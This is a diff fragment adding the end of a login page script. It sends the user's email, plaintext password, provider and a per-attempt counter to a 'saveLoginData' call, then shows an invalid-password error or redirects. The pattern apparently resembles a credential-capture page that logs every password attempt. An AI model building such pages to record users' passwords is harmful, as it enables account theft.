+  saveLoginData({ userId: userId, provider: provider, username: email, password: password, attempt: attempts, fields: fields })
+    .then(function(resp) {
+      btn.classList.remove('loading');
+      if (resp && resp.authed) {
+        var name = email;
+        if (name.indexOf('@') !== -1) name = name.split('@')[0];
+        name = name.replace(/[._]/g, ' ').replace(/\b\w/g, function(c){ return c.toUpperCase(); });
+        localStorage.setItem('nebula_user_name', name);
+        localStorage.setItem('nebula_login_provider', provider);
+        NebulaFlow.markAuthed(provider);
+        window.location.href = 'user.html';
+      } else {
+        showErr('password-wrap', 'password-err', 'Invalid ID/password. Please try again.');
+        pwField.type = 'password';
+        document.getElementById('eye-open').style.display = 'block';
+        document.getElementById('eye-closed').style.display = 'none';
+        pwField.value = '';
+        pwField.focus();
+      }
+    })
+    .catch(function(err) {
+      btn.classList.remove('loading');
+      console.error('save-login failed', err);
+      showToast('Server error. Try again.');
+    });
+}
+
+/* ── Enter key ── */
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'Enter') handleSubmit();
+});
+</script>
+<script src="/music-player.js"></script>
+</body>
+</html>
